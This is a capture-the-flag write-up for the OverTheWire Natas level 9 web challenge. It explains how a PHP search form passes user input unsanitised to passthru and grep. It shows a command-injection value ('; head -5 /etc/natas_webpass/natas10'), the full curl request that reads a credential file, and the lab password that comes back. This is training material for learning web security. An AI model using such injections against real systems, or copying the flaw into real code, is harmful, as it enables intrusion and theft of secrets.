### natas9 pswd: UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9

```bash
curl -v -s -c cookie.txt -X POST http://natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9@natas9.natas.labs.overthewire.org

# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>


```

- view source with curl

```bash
curl -s http://natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9@natas9.natas.labs.overthewire.org/index-source.html | w3m -dump -T text/html

# <body>
# <h1>natas9</h1>
# <div id="content">
# <form>
# Find words containing: <input name=needle><input type=submit name=submit value=
# Search><br><br>
# </form>
# 
# 
# Output:
# <pre>
# <?
# $key = "";
# 
# if(array_key_exists("needle", $_REQUEST)) {
#     $key = $_REQUEST["needle"];
# }
# 
# if($key != "") {
#     passthru("grep -i $key dictionary.txt");
# }
# ?>
# </pre>
# 
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
```

- php highlight

```php
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=
Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```

### 0. What are `<?` and `?>` ?

The webserver usually just reads the HTML file and sends it to the user. 
- `<?` or `<?php` opens the PHP environment
- `?>` closes the PHP environment

The webserver executes the code inside the PHP environment and sends **only** the result of the code to the user.


### 1. The HTML form

```html
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
```

- it prints the text "Find words containing: "
- it renders and empty text box (`<input name=needle>`) to be able to type in
- it renders a clickable button (`<input type=submit>`) with the word "Search" written on it (`value=Search`)

- `<input name=needle>` sets the variable `needle` to the text entered in the text box "Find words containing: [ __ ]"
- `name=submit` creates a variable called `submit`; `value=Search` sets the value of `submit`=`"Search"`

Since the `<form>` tag doesn't have a method specified (e.g., `method="POST"`), it defaults to a **GET request**. This means that clicking on *Search* the browser takes the variables and attaches them directly to the URL. For example entering "apple" in the text box and pressing *Search* the browser will go to:  \
`http://natas9.../index.php?needle=apple&submit=Search`

In the PHP code this *needle* variable is caught by `$_REQUEST["needle"]`.


### 2. The PHP code

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

- we set variable `$key` to value entered in the text box
- if `$key` is not empty we execute `passthru`
- `passthru` is a dangerous php function, it passes the value in parentheses and runs as a command on the linux terminal and passes the terminal's raw output directly back to the web page => e.g. entering "app" in the textbox we're going to list all the words in our `dictionary.txt` that contain the "app" string.

> **Note1:** since the user's input (`$key`) is dropped directly in the `passthru` without clean or escape => this is our attack possibility.

> **Note2:** In the Natas wargames the passwords are stored in the directory `/etc/natas_webpass/` and the password for *natas10* is stored in the file `/etc/natas_webpass/natas10`  \
By default we can read only the current level password (`natas9` in our case) but we'll give it a try with `natas10` maybe the admin gods were generous enough with us to let us have a peak in the future ;-)

- entering `; head -5 /etc/natas_webpass/natas10` the command sent to the webserver linux terminal will be
```bash
grep -i ; head -5 /etc/natas_webpass/natas10 dictionary.txt
```

The terminal will process 2 commands:
1. `grep -i ;` - this will fail because it has no search term (the fault code/message is not forwarded to the browser)
2. `head -5 /etc/natas_webpass/natas10 dictionary.txt` - this will display the first 5 lines of the `natas10` and 5 lines from `dictionary.txt` files.

```bash
curl 'http://natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9@natas9.natas.labs.overthewire.org/?needle=%3B+head+-5+%2Fetc%2Fnatas_webpass%2Fnatas10&submit=Search'
# <html>
# <head>
# <body>
# <h1>natas9</h1>
# <div id="content">
# <form>
# Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
# </form>
# 
# 
# Output:
# <pre>
# ==> /etc/natas_webpass/natas10 <==
  EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
# 
# ==> dictionary.txt <==
# 
# African
# Africans
# Allah
# Allah's
# </pre>
# 
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
```